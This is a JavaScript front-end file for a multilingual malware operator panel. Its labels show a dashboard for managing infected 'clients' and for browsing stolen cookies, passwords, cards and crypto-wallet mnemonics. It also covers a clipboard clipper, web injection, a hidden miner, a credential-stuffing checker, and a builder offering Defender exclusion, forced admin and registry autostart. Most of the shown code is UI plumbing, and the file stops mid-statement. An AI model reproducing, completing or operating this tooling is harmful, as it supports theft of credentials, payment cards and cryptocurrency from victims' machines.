const socket = io();
let operatorKey = '';
let clients = [];
let selectedClientId = null;
let currentView = 'clients';
let currentLang = localStorage.getItem('celestial.lang') || 'en';
let currentTheme = localStorage.getItem('celestial.theme') || 'light';
const notifications = [];
const caches = { recovery: [], wallets: [], proxy: [], webinjection: [], sorter: [], autotasks: [], filestore: [], checkersessions: [] };

const $ = (id) => document.getElementById(id);
const el = (tag, props = {}, children = []) => {
  const n = document.createElement(tag);
  Object.assign(n, props);
  children.forEach(c => n.appendChild(typeof c === 'string' ? document.createTextNode(c) : c));
  return n;
};
const esc = (s) => String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const svg = (path) => {
  const s = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
  s.setAttribute('viewBox','0 0 24 24'); s.setAttribute('fill','none');
  s.setAttribute('stroke','currentColor'); s.setAttribute('stroke-width','1.8');
  s.innerHTML = path;
  return s;
};

/* ===== i18n ===== */
const I18N = {
  en: {
    signin:'Sign in', operatorKey:'Operator Key', operatorKeyPh:'Enter operator key', signIn:'Sign In',
    needAccess:'Need access?', contactAdmin:'Contact admin',
    home:'Home', dashboard:'Dashboard', clients:'Clients', anonymous:'Anonymous', recovery:'Recovery',
    wallets:'Wallets', proxy:'Proxy', clipper:'Clipper', webinjection:'Web Injection',
    sorter:'Sorter', autotasks:'Auto Tasks', filestore:'File Store', miner:'Miner',
    checker:'Checker', checkersessions:'Checker Sessions', builder:'Builder',
    notifications:'Notifications', theme:'Theme', logout:'Logout', profile:'Profile',
    all:'All', columns:'Columns', clearAll:'Clear all',
    baseThemes:'Base', darkThemes:'Dark', gradientThemes:'Nitro Gradients', language:'Language',
    connectedClients:'Connected Clients', recoveryLogs:'Recovery Logs', walletLogs:'Wallet Logs',
    clientBuilder:'Client Builder', autoTasksTitle:'Auto Tasks',
    search:'Search', searchClients:'Search clients...', searchRecovery:'Search recovery logs...',
    searchWallets:'Search wallet logs...', searchProxies:'Search proxies...', searchRules:'Search rules...',
    searchFiles:'Search files...', searchSessions:'Search sessions...', searchJobs:'Search jobs...',
    noClients:'No clients connected.', noData:'No data.', noSorter:'No sorter groups.',
    noTasks:'No tasks.', noMiningJobs:'No mining jobs.', noClipperEntries:'No clipper entries.',
    noRules:'No rules.', noSessions:'No sessions.', noFiles:'No files.',
    refresh:'Refresh', addLog:'Add Log', addWallet:'Add Wallet', addProxy:'Add Proxy',
    addRule:'Add Rule', addGroup:'Add Group', addTask:'Add Task', addJob:'Add Job',
    addSession:'Add Session', addEntry:'Add Entry', upload:'Upload',
    buildClient:'Build Client', save:'Save', cancel:'Cancel', entries:'entries',
    totalLogs:'Total Logs', cookies:'Cookies', passwords:'Passwords', cards:'Cards', applications:'Applications',
    atomic:'Atomic', exodus:'Exodus', phantom:'Phantom', metamask:'MetaMask', trustWallet:'Trust Wallet',
    onlineProxies:'Online Proxies', offlineProxies:'Offline Proxies', totalProxies:'Total Proxies',
    workers:'Workers', totalFiles:'Total Files', totalSize:'Total Size', recent:'Recent (7D)',
    activeMiners:'Active Miners', totalHashrate:'Total Hashrate', cpuHashrate:'CPU Hashrate',
    gpuHashrate:'GPU Hashrate', accepted:'Accepted', rejected:'Rejected', totalRuntime:'Total Runtime',
    totalTasks:'Total Tasks', active:'Active', onceTasks:'Once Tasks', executions:'Executions',
    selectClient:'Select a client first', sent:'Sent', added:'Added', loadFailed:'Load failed',
    invalidKey:'Invalid key', welcome:'Welcome', newClient:'New client connected',
    notifEmpty:'No notifications yet.', command:'Command',
    general:'General', options:'Options', install:'Install', final:'Final',
    clientTag:'Client Tag', note:'Note', mutex:'Mutex',
    defenderExclusion:'Defender Exclusion', forceAdmin:'Force Admin', debug:'Debug',
    enabled:'Enabled', location:'Location', folder:'Folder', filename:'Filename',
    registry:'Registry Autostart', recentBuilds:'Recent builds', buildCreated:'Build created',
    archivePassword:'Archive password',
    colStatus:'Status', colFirstSeen:'First Seen', colIP:'IP', colTag:'Tag', colNote:'Note',
    colUsername:'Username', colMachineName:'Machine Name', colActiveWindow:'Active Window',
    colAntiVirus:'Anti-Virus', colOS:'OS', colCountry:'Country', colUser:'User', colMachine:'Machine',
    colType:'Type', colContents:'Contents', colReceived:'Received', colWallet:'Wallet',
    colPassword:'Password', colMnemonic:'Mnemonic', colProxyHost:'Proxy Host', colPort:'Port',
    colHwid:'Hwid', colRule:'Rule', colUrlPattern:'URL Pattern', colEnabled:'Enabled',
    colReplacement:'Replacement', colName:'Name', colFilter:'Filter', colFormat:'Format',
    colDetail:'Detail', colFired:'Fired', colSize:'Size', colUploaded:'Uploaded',
    colService:'Service', colCombo:'Combo', colStatusSession:'Status', colChecked:'Checked',
    colMode:'Mode', colMatch:'Match', colReplace:'Replace', colLabel:'Label',
    colJobName:'User', colPool:'Machine', colWalletCol:'Wallet', colRole:'Role',
    rowsPerPage:'Rows per page', pageOf:'Page {x} of {y}', rowsSelected:'{x} of {y} row(s) selected',
    pageFirst:'‹', pagePrev:'›', trigger:'TRIGGER', onConnect:'On connect', inChain:'{x} in chain',
    addClipperEntry:'Add Clipper Entry', match:'Match (regex)', replacement:'Replacement',
    groupName:'Group Name', taskName:'Task Name', jobName:'Job Name', pool:'Pool URL', wallet:'Wallet',
    ruleName:'Rule Name', urlPattern:'URL Pattern', originalCode:'Original Code', replacementCode:'Replacement Code',
    service:'Service', combo:'Combo (email:pass)', status:'Status', size:'Size',
    pendingFeature:'Feature pending', settings:'Settings', notImplemented:'Not implemented.',
    anonTitle:'Anonymous Video', anonUrlPh:'https://hentai.pro/watch/...', anonPlay:'Load & Play',
    anonHint:'Paste a hentai.pro watch or video URL. The server fetches and streams it. Your IP never contacts the source.',
    anonLoading:'Resolving video sources...', anonNoSources:'No playable sources found on that page.',
    anonError:'Failed to load. Check the URL or try again.', anonOpenExternal:'Open page in proxy',
    anonBack:'Back', anonSources:'Sources'
  },
  ru: {
    signin:'Вход', operatorKey:'Ключ оператора', operatorKeyPh:'Введите ключ', signIn:'Войти',
    needAccess:'Нет доступа?', contactAdmin:'Связаться с админом',
    home:'Главная', dashboard:'Панель', clients:'Клиенты', anonymous:'Анонимно', recovery:'Восстановление',
    wallets:'Кошельки', proxy:'Прокси', clipper:'Клиппер', webinjection:'Web-инъекции',
    sorter:'Сортировщик', autotasks:'Автозадачи', filestore:'Хранилище', miner:'Майнер',
    checker:'Чекер', checkersessions:'Сессии чекера', builder:'Сборщик',
    notifications:'Уведомления', theme:'Тема', logout:'Выход', profile:'Профиль',
    all:'Все', columns:'Столбцы', clearAll:'Очистить всё',
    baseThemes:'Базовые', darkThemes:'Тёмные', gradientThemes:'Градиенты Nitro', language:'Язык',
    connectedClients:'Подключённые клиенты', recoveryLogs:'Журнал восстановления', walletLogs:'Журнал кошельков',
    clientBuilder:'Сборщик клиента', autoTasksTitle:'Автозадачи',
    search:'Поиск', searchClients:'Поиск клиентов...', searchRecovery:'Поиск логов...',
    searchWallets:'Поиск кошельков...', searchProxies:'Поиск прокси...', searchRules:'Поиск правил...',
    searchFiles:'Поиск файлов...', searchSessions:'Поиск сессий...', searchJobs:'Поиск заданий...',
    noClients:'Нет подключённых клиентов.', noData:'Нет данных.', noSorter:'Нет групп.',
    noTasks:'Нет задач.', noMiningJobs:'Нет заданий.', noClipperEntries:'Нет записей.',
    noRules:'Нет правил.', noSessions:'Нет сессий.', noFiles:'Нет файлов.',
    refresh:'Обновить', addLog:'Добавить', addWallet:'Добавить', addProxy:'Добавить',
    addRule:'Добавить правило', addGroup:'Добавить группу', addTask:'Добавить задачу', addJob:'Добавить задание',
    addSession:'Добавить', addEntry:'Добавить', upload:'Загрузить',
    buildClient:'Собрать клиент', save:'Сохранить', cancel:'Отмена', entries:'записей',
    totalLogs:'Всего', cookies:'Куки', passwords:'Пароли', cards:'Карты', applications:'Приложения',
    atomic:'Atomic', exodus:'Exodus', phantom:'Phantom', metamask:'MetaMask', trustWallet:'Trust Wallet',
    onlineProxies:'Онлайн', offlineProxies:'Офлайн', totalProxies:'Всего',
    workers:'Воркеры', totalFiles:'Файлов', totalSize:'Размер', recent:'7 дней',
    activeMiners:'Активные', totalHashrate:'Хешрейт', cpuHashrate:'CPU', gpuHashrate:'GPU',
    accepted:'Принято', rejected:'Отклонено', totalRuntime:'Время',
    totalTasks:'Задач', active:'Активные', onceTasks:'Одноразовые', executions:'Запусков',
    selectClient:'Выберите клиента', sent:'Отправлено', added:'Добавлено', loadFailed:'Ошибка загрузки',
    invalidKey:'Неверный ключ', welcome:'Добро пожаловать', newClient:'Новый клиент',
    notifEmpty:'Уведомлений нет.', command:'Команда',
    general:'Общие', options:'Опции', install:'Установка', final:'Финал',
    clientTag:'Тег клиента', note:'Заметка', mutex:'Мутекс',
    defenderExclusion:'Defender', forceAdmin:'Админ', debug:'Отладка',
    enabled:'Включено', location:'Расположение', folder:'Папка', filename:'Файл',
    registry:'Автозапуск', recentBuilds:'Сборки', buildCreated:'Сборка создана',
    archivePassword:'Пароль архива',
    colStatus:'Статус', colFirstSeen:'Первый вход', colIP:'IP', colTag:'Тег', colNote:'Заметка',
    colUsername:'Имя', colMachineName:'Машина', colActiveWindow:'Окно',
    colAntiVirus:'Антивирус', colOS:'ОС', colCountry:'Страна', colUser:'Польз.', colMachine:'Машина',
    colType:'Тип', colContents:'Содержимое', colReceived:'Получено', colWallet:'Кошелёк',
    colPassword:'Пароль', colMnemonic:'Мнемоника', colProxyHost:'Хост', colPort:'Порт',
    colHwid:'HWID', colRule:'Правило', colUrlPattern:'URL', colEnabled:'Вкл.',
    colReplacement:'Замена', colName:'Имя', colFilter:'Фильтр', colFormat:'Формат',
    colDetail:'Детали', colFired:'Запуск', colSize:'Размер', colUploaded:'Загружено',
    colService:'Сервис', colCombo:'Комбо', colStatusSession:'Статус', colChecked:'Проверено',
    colMode:'Режим', colMatch:'Match', colReplace:'Замена', colLabel:'Метка',
    colJobName:'Польз.', colPool:'Машина', colWalletCol:'Кошелёк', colRole:'Роль',
    rowsPerPage:'Строк на стр.', pageOf:'Стр. {x} из {y}', rowsSelected:'{x} из {y} строк',
    pageFirst:'‹', pagePrev:'›', trigger:'ТРИГГЕР', onConnect:'При подключении', inChain:'{x} в цепочке',
    addClipperEntry:'Новая запись', match:'Совпадение (regex)', replacement:'Замена',
    groupName:'Имя группы', taskName:'Имя задачи', jobName:'Имя задания', pool:'URL пула', wallet:'Кошелёк',
    ruleName:'Имя правила', urlPattern:'URL-шаблон', originalCode:'Исходный код', replacementCode:'Код замены',
    service:'Сервис', combo:'Комбо (email:pass)', status:'Статус', size:'Размер',
    pendingFeature:'Функция в разработке', settings:'Настройки', notImplemented:'Не реализовано.',
    anonTitle:'Анонимное видео', anonUrlPh:'https://hentai.pro/watch/...', anonPlay:'Загрузить',
    anonHint:'Вставьте ссылку hentai.pro. Сервер загрузит и воспроизведёт. Ваш IP не контактирует с источником.',
    anonLoading:'Поиск источников...', anonNoSources:'Источники не найдены.',
    anonError:'Ошибка загрузки.', anonOpenExternal:'Открыть в прокси',
    anonBack:'Назад', anonSources:'Источники'
  },
  zh: {
    signin:'登录', operatorKey:'操作员密钥', operatorKeyPh:'输入密钥', signIn:'登录',
    needAccess:'没有权限？', contactAdmin:'联系管理员',
    home:'主页', dashboard:'仪表盘', clients:'客户端', anonymous:'匿名', recovery:'恢复',
    wallets:'钱包', proxy:'代理', clipper:'剪贴板', webinjection:'网页注入',
    sorter:'分类器', autotasks:'自动任务', filestore:'文件存储', miner:'挖矿',
    checker:'检查器', checkersessions:'检查会话', builder:'构建器',
    notifications:'通知', theme:'主题', logout:'退出', profile:'资料',
    all:'全部', columns:'列', clearAll:'清空全部',
    baseThemes:'基础', darkThemes:'深色', gradientThemes:'Nitro 渐变', language:'语言',
    connectedClients:'已连接客户端', recoveryLogs:'恢复日志', walletLogs:'钱包日志',
    clientBuilder:'客户端构建器', autoTasksTitle:'自动任务',
    search:'搜索', searchClients:'搜索客户端...', searchRecovery:'搜索日志...',
    searchWallets:'搜索钱包...', searchProxies:'搜索代理...', searchRules:'搜索规则...',
    searchFiles:'搜索文件...', searchSessions:'搜索会话...', searchJobs:'搜索作业...',
    noClients:'无客户端连接。', noData:'无数据。', noSorter:'无分组。',
    noTasks:'无任务。', noMiningJobs:'无作业。', noClipperEntries:'无记录。',
    noRules:'无规则。', noSessions:'无会话。', noFiles:'无文件。',
    refresh:'刷新', addLog:'添加日志', addWallet:'添加钱包', addProxy:'添加代理',
    addRule:'添加规则', addGroup:'添加分组', addTask:'添加任务', addJob:'添加作业',
    addSession:'添加会话', addEntry:'添加记录', upload:'上传',
    buildClient:'构建客户端', save:'保存', cancel:'取消', entries:'条',
    totalLogs:'总日志', cookies:'Cookie', passwords:'密码', cards:'卡片', applications:'应用',
    atomic:'Atomic', exodus:'Exodus', phantom:'Phantom', metamask:'MetaMask', trustWallet:'Trust Wallet',
    onlineProxies:'在线代理', offlineProxies:'离线代理', totalProxies:'总代理',
    workers:'工作线程', totalFiles:'文件总数', totalSize:'总大小', recent:'最近7天',
    activeMiners:'活跃矿机', totalHashrate:'总算力', cpuHashrate:'CPU', gpuHashrate:'GPU',
    accepted:'已接受', rejected:'已拒绝', totalRuntime:'运行时间',
    totalTasks:'任务总数', active:'活跃', onceTasks:'一次性', executions:'执行次数',
    selectClient:'请先选择客户端', sent:'已发送', added:'已添加', loadFailed:'加载失败',
    invalidKey:'密钥无效', welcome:'欢迎', newClient:'新客户端已连接',
    notifEmpty:'暂无通知。', command:'命令',
    general:'通用', options:'选项', install:'安装', final:'最终',
    clientTag:'客户端标签', note:'备注', mutex:'互斥锁',
    defenderExclusion:'Defender 排除', forceAdmin:'强制管理员', debug:'调试',
    enabled:'启用', location:'位置', folder:'文件夹', filename:'文件名',
    registry:'注册表启动', recentBuilds:'最近构建', buildCreated:'构建已创建',
    archivePassword:'压缩包密码',
    colStatus:'状态', colFirstSeen:'首次出现', colIP:'IP', colTag:'标签', colNote:'备注',
    colUsername:'用户名', colMachineName:'机器名', colActiveWindow:'活动窗口',
    colAntiVirus:'杀毒', colOS:'系统', colCountry:'国家', colUser:'用户', colMachine:'机器',
    colType:'类型', colContents:'内容', colReceived:'接收', colWallet:'钱包',
    colPassword:'密码', colMnemonic:'助记词', colProxyHost:'主机', colPort:'端口',
    colHwid:'HWID', colRule:'规则', colUrlPattern:'URL', colEnabled:'启用',
    colReplacement:'替换', colName:'名称', colFilter:'过滤器', colFormat:'格式',
    colDetail:'详情', colFired:'已触发', colSize:'大小', colUploaded:'已上传',
    colService:'服务', colCombo:'组合', colStatusSession:'状态', colChecked:'已检查',
    colMode:'模式', colMatch:'匹配', colReplace:'替换', colLabel:'标签',
    colJobName:'用户', colPool:'机器', colWalletCol:'钱包', colRole:'角色',
    rowsPerPage:'每页行数', pageOf:'第 {x} 页 / 共 {y} 页', rowsSelected:'已选 {x} 行 / 共 {y} 行',
    pageFirst:'‹', pagePrev:'›', trigger:'触发器', onConnect:'连接时', inChain:'{x} 个链路',
    addClipperEntry:'添加记录', match:'匹配 (regex)', replacement:'替换',
    groupName:'分组名称', taskName:'任务名称', jobName:'作业名称', pool:'矿池 URL', wallet:'钱包',
    ruleName:'规则名称', urlPattern:'URL 模式', originalCode:'原始代码', replacementCode:'替换代码',
    service:'服务', combo:'组合 (email:pass)', status:'状态', size:'大小',
    pendingFeature:'功能开发中', settings:'设置', notImplemented:'未实现。',
    anonTitle:'匿名视频', anonUrlPh:'https://hentai.pro/watch/...', anonPlay:'加载播放',
    anonHint:'粘贴 hentai.pro 链接。服务器获取并播放。你的 IP 不会接触源站。',
    anonLoading:'正在解析视频源...', anonNoSources:'未找到可播放源。',
    anonError:'加载失败。', anonOpenExternal:'在代理中打开',
    anonBack:'返回', anonSources:'视频源'
  }
};

function t(k) { return (I18N[currentLang] && I18N[currentLang][k]) || I18N.en[k] || k; }
function fmt(k, vars) {
  let s = t(k);
  Object.entries(vars || {}).forEach(([key, val]) => { s = s.replace('{' + key + '}', val); });
  return s;
}

function applyLang(code) {
  currentLang = code;
  localStorage.setItem('celestial.lang', code);
  document.documentElement.lang = code;
  document.querySelectorAll('[data-i18n]').forEach(n => { n.textContent = t(n.dataset.i18n); });
  document.querySelectorAll('[data-i18n-placeholder]').forEach(n => { n.placeholder = t(n.dataset.i18nPlaceholder); });
  document.querySelectorAll('#loginLangs button, #themeLangs button').forEach(b => b.classList.toggle('active', b.dataset.lang === code));
  if (!$('app').classList.contains('hidden')) loadView(currentView);
}

/* ===== Themes ===== */
const THEMES = [
  { id:'light',        label:'Light',    group:'base', preview:'linear-gradient(135deg,#ffffff,#f3f4f6)' },
  { id:'sepia',        label:'Sepia',    group:'base', preview:'linear-gradient(135deg,#fbf6ee,#e2d3b3)' },
  { id:'solarized',    label:'Solarized',group:'base', preview:'linear-gradient(135deg,#fdf6e3,#268bd2)' },
  { id:'dark',         label:'Dark',     group:'dark', preview:'linear-gradient(135deg,#1a1d21,#2b3038)' },
  { id:'midnight',     label:'Midnight', group:'dark', preview:'linear-gradient(135deg,#0f172a,#38bdf8)' },
  { id:'nord',         label:'Nord',     group:'dark', preview:'linear-gradient(135deg,#2e3440,#88c0d0)' },
  { id:'dracula',      label:'Dracula',  group:'dark', preview:'linear-gradient(135deg,#282a36,#bd93f9)' },
  { id:'tokyo',        label:'Tokyo',    group:'dark', preview:'linear-gradient(135deg,#1a1b26,#7aa2f7)' },
  { id:'catppuccin',   label:'Catppuccin',group:'dark',preview:'linear-gradient(135deg,#1e1e2e,#cba6f7)' },
  { id:'gruvbox',      label:'Gruvbox',  group:'dark', preview:'linear-gradient(135deg,#282828,#fabd2f)' },
  { id:'rosepine',     label:'Rosé Pine',group:'dark', preview:'linear-gradient(135deg,#191724,#eb6f92)' },
  { id:'onedark',      label:'One Dark', group:'dark', preview:'linear-gradient(135deg,#282c34,#61afef)' },
  { id:'nitro-aurora',    label:'Aurora',    group:'gradient', preview:'linear-gradient(135deg,#667eea,#764ba2,#22d3ee)' },
  { id:'nitro-sunset',    label:'Sunset',    group:'gradient', preview:'linear-gradient(135deg,#fa709a,#fee140,#ff6b6b)' },
  { id:'nitro-ocean',     label:'Ocean',     group:'gradient', preview:'linear-gradient(135deg,#2193b0,#6dd5ed,#1e3c72)' },
  { id:'nitro-forest',    label:'Forest',    group:'gradient', preview:'linear-gradient(135deg,#11998e,#38ef7d,#085078)' },
  { id:'nitro-rose',      label:'Rose',      group:'gradient', preview:'linear-gradient(135deg,#ee9ca7,#c471ed,#f64f59)' },
  { id:'nitro-cyber',     label:'Cyber',     group:'gradient', preview:'linear-gradient(135deg,#ff00cc,#333399,#00f0ff)' },
  { id:'nitro-candy',     label:'Candy',     group:'gradient', preview:'linear-gradient(135deg,#a18cd1,#fbc2eb,#ffecd2)' },
  { id:'nitro-flame',     label:'Flame',     group:'gradient', preview:'linear-gradient(135deg,#f12711,#f5af19,#f12711)' },
  { id:'nitro-mono',      label:'Mono',      group:'gradient', preview:'linear-gradient(135deg,#232526,#5c5f61,#414345)' },
  { id:'nitro-neon',      label:'Neon',      group:'gradient', preview:'linear-gradient(135deg,#00f5d4,#00bbf9,#9b5de5,#f15bb5)' },
  { id:'nitro-matrix',    label:'Matrix',    group:'gradient', preview:'linear-gradient(135deg,#0f0c29,#00ff41,#302b63)' },
  { id:'nitro-vaporwave', label:'Vaporwave', group:'gradient', preview:'linear-gradient(135deg,#ff6ec4,#7873f5,#4ade80)' },
  { id:'nitro-synthwave', label:'Synthwave', group:'gradient', preview:'linear-gradient(135deg,#fc466b,#3f5efb)' },
  { id:'nitro-galaxy',    label:'Galaxy',    group:'gradient', preview:'linear-gradient(135deg,#0f0c29,#302b63,#6a11cb,#2575fc)' },
  { id:'nitro-tropical',  label:'Tropical',  group:'gradient', preview:'linear-gradient(135deg,#00b4db,#00f260,#0575e6)' },
  { id:'nitro-ember',     label:'Ember',     group:'gradient', preview:'linear-gradient(135deg,#1a0000,#ff4500,#ff8c00)' },
  { id:'nitro-ice',       label:'Ice',       group:'gradient', preview:'linear-gradient(135deg,#83a4d4,#b6fbff,#e0f7ff)' },
  { id:'nitro-sakura',    label:'Sakura',    group:'gradient', preview:'linear-gradient(135deg,#ffdde1,#ee9ca7,#ffb7c5)' },
  { id:'nitro-royal',     label:'Royal',     group:'gradient', preview:'linear-gradient(135deg,#1a2a6c,#b21f1f,#fdbb2d)' },
  { id:'nitro-lava',      label:'Lava',      group:'gradient', preview:'linear-gradient(135deg,#200122,#6f0000,#ff512f,#dd2476)' },
  { id:'nitro-mint',      label:'Mint',      group:'gradient', preview:'linear-gradient(135deg,#a8ff78,#78ffd6,#43e97b)' },
  { id:'nitro-cotton',    label:'Cotton',    group:'gradient', preview:'linear-gradient(135deg,#ff9a9e,#fecfef,#a1c4fd)' },
  { id:'nitro-cosmic',    label:'Cosmic',    group:'gradient', preview:'linear-gradient(135deg,#20002c,#cbb4d4,#20002c)' },
  { id:'nitro-rainbow',   label:'Rainbow',   group:'gradient', preview:'linear-gradient(90deg,#ff0000,#ff8c00,#ffee00,#00c853,#00b0ff,#d500f9)' }
];

function applyTheme(id) {
  currentTheme = id;
  localStorage.setItem('celestial.theme', id);
  document.body.setAttribute('data-theme', id);
  document.querySelectorAll('.theme-swatch').forEach(s => s.classList.toggle('active', s.dataset.theme === id));
}

function renderThemePanel() {
  const base = $('themeBase'), dark = $('themeDark'), grad = $('themeGradients');
  base.innerHTML = ''; dark.innerHTML = ''; grad.innerHTML = '';
  THEMES.forEach(th => {
    const sw = el('div', { className: 'theme-swatch' });
    sw.dataset.theme = th.id;
    sw.style.background = th.preview;
    sw.style.backgroundSize = '200% 200%';
    sw.appendChild(el('div', { className: 'ts-check' }, ['✓']));
    sw.appendChild(el('div', { className: 'ts-label' }, [th.label]));
    sw.onclick = () => applyTheme(th.id);
    if (th.group === 'gradient') grad.appendChild(sw);
    else if (th.group === 'dark') dark.appendChild(sw);
    else base.appendChild(sw);
  });
  applyTheme(currentTheme);
}

/* ===== Notifications ===== */
function addNotification(title, msg) {
  notifications.unshift({ id: Date.now().toString(36), title, msg, time: new Date() });
  if (notifications.length > 100) notifications.pop();
  renderNotifications();
  toast(title + ': ' + msg, 3000);
}
function renderNotifications() {
  const list = $('notifList'), badge = $('notifBadge');
  if (!notifications.length) {
    list.innerHTML = '';
    list.appendChild(el('div', { className: 'notif-empty' }, [t('notifEmpty')]));
    badge.classList.add('hidden');
    return;
  }
  badge.textContent = notifications.length;
  badge.classList.remove('hidden');
  list.innerHTML = '';
  notifications.forEach(n => {
    const item = el('div', { className: 'notif-item' });
    item.appendChild(el('div', { className: 'ni-dot' }));
    const body = el('div', { className: 'ni-body' });
    body.appendChild(el('div', { className: 'ni-title' }, [n.title]));
    body.appendChild(el('div', { className: 'ni-msg' }, [n.msg]));
    body.appendChild(el('div', { className: 'ni-time' }, [n.time.toLocaleTimeString()]));
    item.appendChild(body);
    list.appendChild(item);
  });
}

function toast(msg, ms = 2500) {
  const tt = $('toast');
  tt.textContent = msg;
  tt.classList.remove('hidden');
  clearTimeout(toast._t);
  toast._t = setTimeout(() => tt.classList.add('hidden'), ms);
}

/* ===== Panels ===== */
function toggleNotifPanel() {
  const p = $('notifPanel'), o = $('themePanel');
  o.classList.add('hidden');
  p.classList.toggle('hidden');
}
function toggleThemePanel() {
  const p = $('themePanel'), o = $('notifPanel');
  o.classList.add('hidden');
  p.classList.toggle('hidden');
}

/* ===== Modal / Context ===== */
function openModal(title, bodyNodes) {
  $('modalTitle').textContent = title;
  const body = $('modalBody');
  body.innerHTML = '';
  bodyNodes.forEach(n => body.appendChild(n));
  $('modal').classList.remove('hidden');
}
function closeModal() { $('modal').classList.add('hidden'); hideCtx(); }
function hideCtx() { $('ctxmenu').classList.add('hidden'); }

function showCtxMenu(e, items) {
  const m = $('ctxmenu');
  m.innerHTML = '';
  const build = (parent, list) => {
    list.forEach(it => {
      if (it.sep) { parent.appendChild(el('div', { className: 'ctx-sep' })); return; }
      const row = el('div', { className: 'ctx-item' + (it.sub ? ' has-sub' : '') });
      if (it.icon) row.appendChild(svg(it.icon));
      row.appendChild(document.createTextNode(it.label));
      if (it.sub) {
        row.appendChild(el('span', { className: 'arrow' }, ['›']));
        const sub = el('div', { className: 'ctx-sub' });
        build(sub, it.sub);
        row.appendChild(sub);
      } else if (it.action) {
        row.onclick = (ev) => { ev.stopPropagation(); it.action(); hideCtx(); };
      }
      parent.appendChild(row);
    });
  };
  build(m, items);
  m.classList.remove('hidden');
  const x = Math.min(e.clientX, window.innerWidth - 260);
  const y = Math.min(e.clientY, window.innerHeight - m.offsetHeight - 20);
  m.style.left = x + 'px';
  m.style.top = y + 'px';
}

/* ===== Auth ===== */
$('loginBtn').onclick = () => {
  const key = $('keyInput').value.trim();
  if (!key) return;
  operatorKey = key;
  socket.emit('operator:register', key);
};
$('keyInput').addEventListener('keydown', e => { if (e.key === 'Enter') $('loginBtn').click(); });

socket.on('operator:ready', () => {
  $('login').classList.add('hidden');
  $('app').classList.remove('hidden');
  $('statusIndicator').className = 'status status-online';
  addNotification(t('notifications'), t('welcome'));
  loadView('clients');
});
socket.on('operator:error', () => { $('loginError').textContent = t('invalidKey'); });
$('logoutBtn').onclick = () => location.reload();

function api(path, opts = {}) {
  return fetch(path, { ...opts, headers: { 'content-type': 'application/json', 'x-operator-key': operatorKey, ...(opts.headers || {}) } }).then(r => r.json());
}

/* ===== Nav ===== */
document.querySelectorAll('#nav button').forEach(btn => {
  btn.onclick = () => loadView(btn.dataset.view);
});
function setActiveNav(view) {
  document.querySelectorAll('#nav button').forEach(b => b.classList.toggle('active', b.dataset.view === view));
}
const TITLES = {
  home:'home', dashboard:'dashboard', clients:'connectedClients', anonymous:'anonymous', recovery:'recoveryLogs',
  wallets:'walletLogs', proxy:'proxy', clipper:'clipper', webinjection:'webinjection',
  sorter:'sorter', autotasks:'autoTasksTitle', filestore:'filestore', miner:'miner',
  checker:'checker', checkersessions:'checkersessions', builder:'clientBuilder'
};
function loadView(view) {
  currentView = view;
  setActiveNav(view);
  const root = $('viewRoot');
  root.innerHTML = '';
  $('viewTitle').textContent = t(TITLES[view] || view);
  const fn = views[view];
  if (fn) fn(root);
  else root.appendChild(el('div', { className: 'empty' }, [t('notImplemented')]));
}

/* ===== Helpers ===== */
function searchBar(placeholderKey, onInput) {
  const bar = el('div', { className: 'searchbar' });
  bar.appendChild
